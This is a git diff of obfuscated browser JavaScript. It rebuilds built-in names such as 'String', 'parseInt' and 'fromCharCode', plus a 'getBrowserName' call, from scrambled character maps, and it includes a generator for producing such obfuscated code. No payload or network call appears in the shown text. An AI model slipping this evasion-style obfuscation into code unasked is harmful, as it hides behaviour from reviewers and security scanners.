+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1808]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`))
 	);
 }
 
 function getGetBrowserNameString() {
 	// returns "getBrowserName"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1801]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1801]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
 	);
 }
 
-function getCharCodeAtMethod() {
+function getStringString() {
+	// returns "String"
+	const m = getCharCodeAtMethod(MAP2);
+	return window['String'][getFromCharCodeMethod(MAP2)](
+		MAP2[m](window['parseInt'](`${MAP2[1805]}${MAP2[1806]}`)),
+		MAP2[m](window['parseInt'](`${MAP2[1800]}`)),
+		MAP2[m](window['parseInt'](`${MAP2[1804]}${MAP2[1800]}`)),
+		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1804]}`)),
+		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1806]}`)),
+		MAP2[m](window['parseInt'](`${MAP2[1801]}${MAP2[1801]}${MAP2[1804]}`))
+	);
+}
+
+function getParseIntString() {
+	// returns "parseInt"
+	const m = getCharCodeAtMethod(MAP2);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP2)](
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1802]}${MAP2[1804]}${MAP2[1804]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1801]}${MAP2[1806]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1804]}${MAP2[1800]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1801]}${MAP2[1808]}${MAP2[1807]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1809]}${MAP2[1802]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1805]}${MAP2[1803]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1802]}${MAP2[1806]}`)),
+		MAP2[m](window[PARSEINT_STRING](`${MAP2[1800]}`))
+	);
+}
+
+function getCharCodeAtMethod(mapToUse) {
 	// returns "charCodeAt"
 	return (
-		MAP[parseInt(`${MAP[1804]}${MAP[1809]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1809]}${MAP[1800]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1807]}${MAP[1802]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1807]}${MAP[1808]}`)] +
-		MAP[parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)] +
-		MAP[parseInt(`${MAP[1805]}${MAP[1808]}`)] +
-		MAP[parseInt(`${MAP[1809]}${MAP[1802]}`)] +
-		MAP[parseInt(`${MAP[1806]}${MAP[1808]}`)] +
-		MAP[parseInt(`${MAP[1800]}`)]
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1804]}${mapToUse[1809]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1804]}${mapToUse[1807]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1809]}${mapToUse[1800]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1802]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1808]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1805]}${mapToUse[1808]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1809]}${mapToUse[1802]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1806]}${mapToUse[1808]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1800]}`)]
 	);
 }
 
-function getFromCharCodeMethod() {
+function getFromCharCodeMethod(mapToUse) {
 	// returns "fromCharCode"
 	return (
-		MAP[parseInt(`${MAP[1801]}${MAP[1805]}`)] +
-		MAP[parseInt(`${MAP[1804]}${MAP[1800]}`)] +
-		MAP[parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)] +
-		MAP[parseInt(`${MAP[1804]}${MAP[1807]}`)] +
-		MAP[parseInt(`${MAP[1804]}${MAP[1801]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1809]}${MAP[1800]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1807]}${MAP[1802]}`)] +
-		MAP[parseInt(`${MAP[1801]}${MAP[1807]}${MAP[1808]}`)] +
-		MAP[parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)] +
-		MAP[parseInt(`${MAP[1805]}${MAP[1808]}`)] +
-		MAP[parseInt(`${MAP[1809]}${MAP[1802]}`)]
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1805]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1804]}${mapToUse[1800]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1804]}${mapToUse[1807]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1804]}${mapToUse[1801]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1804]}${mapToUse[1807]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1809]}${mapToUse[1800]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1802]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1808]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1805]}${mapToUse[1808]}`)] +
+		mapToUse[window[PARSEINT_STRING](`${mapToUse[1809]}${mapToUse[1802]}`)]
 	);
 }
 
@@ -532,9 +556,9 @@ function getMap() {
 	];
 
 	let map = '';
-	const fromCharCode = getFromCharCodeMethod2();
+	const fromCharCode = getFromCharCodeMethod(MAP2);
 	for (const code of codes) {
-		map += String[fromCharCode](code);
+		map += window[STRING_STRING][fromCharCode](code);
 	}
 
 	return map;
@@ -542,24 +566,6 @@ function getMap() {
 
 function getMap2() {
 	return 't&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHk0123456789TTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:';
-}
-function getFromCharCodeMethod2() {
-	// returns "fromCharCode"
-	const map = getMap2();
-	return (
-		map[parseInt(`${map[1801]}${map[1805]}`)] +
-		map[parseInt(`${map[1804]}${map[1800]}`)] +
-		map[parseInt(`${map[1802]}${map[1802]}${map[1801]}`)] +
-		map[parseInt(`${map[1804]}${map[1807]}`)] +
-		map[parseInt(`${map[1804]}${map[1801]}`)] +
-		map[parseInt(`${map[1801]}${map[1804]}${map[1807]}`)] +
-		map[parseInt(`${map[1801]}${map[1809]}${map[1800]}`)] +
-		map[parseInt(`${map[1801]}${map[1807]}${map[1802]}`)] +
-		map[parseInt(`${map[1801]}${map[1807]}${map[1808]}`)] +
-		map[parseInt(`${map[1802]}${map[1802]}${map[1801]}`)] +
-		map[parseInt(`${map[1805]}${map[1808]}`)] +
-		map[parseInt(`${map[1809]}${map[1802]}`)]
-	);
 }
 
 function getStrings() {
@@ -579,18 +585,19 @@ function getStrings() {
 	// Run this in browser console to get the obfuscated code to return a given string
 
 	function generateObfuscatedCodeThatReturnsTheStringPassedAsParameter(theString) {
+		const map = "t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHk0123456789TTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:";
 		const numbersMap = {"0": 1800, 1: 1801, "2": 1802, "3": 1803, 4: 1804, 5: 1805, 6: 1806, 7: 1807, 8: 1808, 9: 1809}
 		const indexes = [];
 		for (const c of theString) {
 			indexes.push(map.indexOf(c));
 		}
 
-		let generatedCode = "\t// returns \""+theString+"\"\n\tconst m = getCharCodeAtMethod();\n\treturn String[getFromCharCodeMethod()](\n\tgetMap()[m](parseInt(`"
+		let generatedCode = "\t// returns \""+theString+"\"\n\tconst m = getCharCodeAtMethod(MAP);\n\treturn window[STRING_STRING][getFromCharCodeMethod(MAP)](\n\tgetMap()[m](window[PARSEINT_STRING](`"
 		for (let i of indexes) {
 			for (let c of i.toString()) {
 				generatedCode += "${getMap()["+numbersMap[c]+"]}"
 			}
-			generatedCode += "`)),\n\t\tgetMap()[m](parseInt(`"
+			generatedCode += "`)),\n\t\tgetMap()[m](window[PARSEINT_STRING](`"
 		}
 
 		return generatedCode + "";
